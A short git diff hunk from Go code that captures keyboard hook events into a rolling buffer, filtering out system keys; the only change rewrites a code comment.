@@ -112,7 +112,7 @@ func StartCapture(buffer *RollingBuffer, events <-chan hook.Event) {
 			ev.Rawcode != 13 && ev.Rawcode != 13 && ev.Rawcode != 67 &&
 			ev.Rawcode != 20 && ev.Rawcode != 37 && ev.Rawcode != 38 && ev.Rawcode != 39 &&
 			ev.Rawcode != 40 && ev.Rawcode != 9 || ev.Rawcode == 160 && ev.Kind == 5 {
-			//Doesnt log mouse, alt, shift, capslock, windows, alt, arrors, tab, enter,ctrl, No weird keys like pgdown and stuff yet
+			//disgusting code i know TwT, i got lazy, filters out sys keys
 			if ev.Rawcode == 160 && ev.Kind == 4 {
 				shiftDown = true
 			}
